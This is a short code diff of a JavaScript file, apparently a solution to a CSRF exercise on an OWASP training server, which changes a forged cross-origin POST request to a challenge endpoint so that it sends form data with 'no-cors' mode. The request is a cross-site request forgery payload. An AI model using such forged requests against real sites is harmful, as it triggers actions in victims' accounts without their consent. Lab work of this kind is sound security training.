@@ -35,9 +35,11 @@ let rotateText = () => {
 };
 rotateText();
 setInterval(rotateText, 4000);
+const form = document.getElementById("myForm");
+const formData = new FormData(form); // Récupère les données du formulaire
 
-const headers = Headers();
-fetch('https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus?userId=b1432c3899259d46b31bbfd27a95d32abdbc1f75', {
+fetch('https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus', {
   method:"POST",
-  mode: "no-cors"
+  mode: "no-cors",
+  body: formData
 })
